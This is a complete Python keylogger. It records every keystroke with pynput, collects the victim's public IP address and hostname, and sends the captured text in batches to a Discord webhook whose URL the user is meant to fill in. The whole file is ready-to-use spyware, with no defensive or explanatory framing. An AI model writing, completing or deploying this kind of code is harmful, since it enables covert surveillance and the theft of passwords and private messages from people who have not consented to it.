from pynput import keyboard

from discord_webhook import AsyncDiscordWebhook, DiscordEmbed
import requests
import asyncio

import os
 
webhook_url = "" # Your webhook url here

class Logger():
    def __init__(self):
        self.__max_len = 100
        self.recorded_string = ""
        self.data = []
        self.webhook = AsyncDiscordWebhook(
            url=webhook_url,
            rate_limit_retry=True,
        )
        self.ip = requests.get('https://api.ipify.org/').text

        self.hostname = os.getenv('COMPUTERNAME')
    
    async def send(self):
        self.convert_unprintable()
        
        embed = DiscordEmbed(title='Key Logger', description=f'Data from {self.hostname} | {self.ip}')
        embed.add_embed_field("data", self.recorded_string, False)
        
        self.webhook.add_embed(embed)
        await self.webhook.execute(remove_embeds=True)
        

    def send_data(self):
        asyncio.run(self.send())
        return
    
    def convert_unprintable(self): 

        new_string = ""
        for char in self.recorded_string:
            if 0 <= ord(char) < 31:
                new_string += f" CTRL + {chr(ord(char) + 64)} "
            else:
                new_string += char
        self.recorded_string = new_string
                
    def check_word_len(self):
        if len(self.recorded_string) > self.__max_len:
            self.send_data()
            self.recorded_string = ""
    
    def on_press(self, key):
        if hasattr(key, 'char') and key.char != None:
            self.recorded_string += key.char
        elif key == keyboard.Key.space:
            self.recorded_string += " "
        elif key == keyboard.Key.enter:
            self.recorded_string += " [Enter] "
        elif key == keyboard.Key.tab:
            self.recorded_string += " [Tab] "
        elif key == keyboard.Key.backspace:
            self.recorded_string = self.recorded_string[:-1]
        elif key in [keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right]:
            self.recorded_string += " [{}] ".format(key)
            
        self.check_word_len()
            
if __name__ == "__main__":

    logger = Logger()
    listener = keyboard.Listener(
        on_press=logger.on_press)
    listener.start()

    while True:
        pass